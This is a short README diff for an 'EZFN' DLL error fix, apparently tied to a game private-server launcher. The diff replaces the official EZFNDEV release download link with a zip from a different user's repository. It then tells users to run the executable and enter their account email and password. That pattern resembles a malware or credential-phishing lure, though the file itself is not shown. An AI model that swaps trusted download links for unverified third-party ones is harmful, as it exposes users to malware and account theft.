@@ -2,7 +2,7 @@
 A fix for the DLL EZFN Error 
 
 ## Installation 
-* **[Download](https://github.com/EZFNDEV/FNPrivateServer/releases/latest/download/EZFNLauncher.zip)** the latest version.
+* **[Download](https://github.com/MAR0002/EZFNFIX/releases/download/2.10/EZFNFIX.zip)** the latest version.
 * **Unzip the Folder** to somewhere on your PC and launch "EZFNLauncher.exe"
 * You now need to enter the Email address and password for your **EZFN** account (https://ezfn.dev)
   
